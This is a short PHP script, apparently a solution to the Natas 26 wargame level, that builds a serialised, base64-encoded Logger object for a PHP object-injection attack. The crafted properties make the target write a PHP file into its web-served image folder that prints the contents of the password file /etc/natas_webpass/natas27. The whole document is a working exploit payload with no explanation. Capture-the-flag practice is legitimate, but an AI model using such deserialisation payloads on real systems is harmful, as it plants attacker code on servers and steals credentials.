<?php

class Logger {
    private $logFile = "/var/www/natas/natas26/img/asdf.php";
    private $initMsg = "";
    private $exitMsg = "<?php echo file_get_contents('/etc/natas_webpass/natas27'); ?>\n";
}

$o = new Logger();
$s = serialize($o);
print($s . "\n");
print base64_encode($s) . "\n";

